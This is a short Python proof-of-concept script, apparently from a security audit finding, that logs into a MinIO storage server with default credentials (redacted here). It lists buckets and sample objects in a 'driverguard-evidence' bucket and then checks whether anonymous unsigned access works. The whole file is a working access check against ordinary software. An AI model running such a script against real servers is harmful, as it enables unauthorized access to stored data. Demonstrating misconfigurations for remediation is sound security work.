#!/usr/bin/env python3
"""P-136 — PoC MinIO default credentials. Chạy NGOÀI thư mục repo."""
import boto3
from botocore.client import Config
from botocore import UNSIGNED
EP = "http://<REDACTED_IP>:9000"
s3 = boto3.client("s3", endpoint_url=EP, aws_access_key_id="<REDACTED_MINIO_USER>",
                  aws_secret_access_key="<REDACTED_MINIO_PASS>",
                  config=Config(signature_version="s3v4"), region_name="us-east-1")
print("buckets:", [b["Name"] for b in s3.list_buckets().get("Buckets", [])])
o = s3.list_objects_v2(Bucket="driverguard-evidence", MaxKeys=5)
print("sample objects:", [x["Key"] for x in o.get("Contents", [])][:5])
try:
    an = boto3.client("s3", endpoint_url=EP, config=Config(signature_version=UNSIGNED))
    an.list_objects_v2(Bucket="driverguard-evidence", MaxKeys=1)
    print("anonymous: WORKS (bucket public)")
except Exception as e:
    print("anonymous:", str(e)[:80])
